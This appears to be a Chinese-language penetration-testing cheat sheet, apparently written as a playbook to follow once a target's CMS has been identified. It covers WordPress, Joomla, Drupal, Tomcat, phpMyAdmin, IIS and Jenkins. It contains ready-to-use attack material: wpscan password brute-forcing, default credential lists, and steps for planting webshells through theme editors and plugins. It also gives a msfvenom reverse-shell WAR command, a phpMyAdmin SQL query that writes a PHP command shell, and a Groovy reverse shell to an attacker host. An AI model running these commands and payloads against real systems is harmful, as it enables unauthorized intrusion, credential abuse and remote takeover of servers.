# CMS 专项扫描速查

识别到特定CMS后，按此文件执行专项扫描。

---

## WordPress

```
# 枚举插件+主题+用户+已知漏洞（需API token）
wpscan --url http://TARGET -e ap,at,u --api-token <token>

# 枚举后加密码爆破
wpscan --url http://TARGET -e u --api-token <token> -P /usr/share/wordlists/rockyou.txt
```

**高价值路径：**
```
/wp-login.php              # 登录页
/wp-admin/                 # 管理后台
/wp-content/plugins/       # 插件目录（漏洞高发区）
/wp-content/uploads/       # 上传文件
/wp-config.php             # 数据库凭据（无法直接访问，LFI可读）
/xmlrpc.php                # XML-RPC接口（可暴力破解/SSRF）
```

**拿到管理员后getshell：**
- 外观→主题编辑器→修改404.php插入webshell
- 插件→添加新插件→上传恶意插件zip

## Joomla

```
joomscan -u http://TARGET
# 或手动检查
/administrator/            # 管理后台
/configuration.php         # 配置文件（LFI可读）
/README.txt                # 版本信息
/language/en-GB/en-GB.xml  # 版本信息
```

## Drupal

```
droopescan scan drupal -u http://TARGET

/CHANGELOG.txt             # 版本信息
/core/CHANGELOG.txt        # Drupal 8+
/user/login                # 登录页
/node/1                    # 内容节点
```

**Drupalgeddon系列（高危）：** 用 searchsploit 或 web_search 搜 `Drupal <版本> RCE`。

## Tomcat

```
# 默认管理后台
/manager/html              # 需认证
/host-manager/html

# 常见默认凭据
tomcat:tomcat
admin:admin
tomcat:s3cret
admin:password
```

**拿到管理员后getshell：**
```
# 生成恶意WAR包
msfvenom -p java/shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war

# 部署：管理后台上传WAR → 访问 /shell/ 触发
```

## phpMyAdmin

```
/phpmyadmin                # 默认路径
/pma
/mysql

# 默认凭据
root:(空)
root:root
```

**拿到访问后：**
- SQL标签页执行 `SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE "/var/www/html/shell.php"`

## IIS / ASP.NET

```
/iisstart.htm              # 默认页
/aspnet_client/            # ASP.NET标记
/web.config                # 配置（可能含连接字符串，LFI/目录遍历可读）
```

**短文件名枚举：**
```
# IIS 8.3短文件名漏洞
python3 iis_shortname_scanner.py http://TARGET/
```

## Jenkins

```
/script                    # Groovy脚本控制台（未认证=直接RCE）
/manage                    # 管理页
/credentials               # 凭据管理
```

**Groovy反弹shell：**
```groovy
String host="KALI"; int port=4444;
String cmd="/bin/bash"; Process p=["bash","-c","bash -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();
```
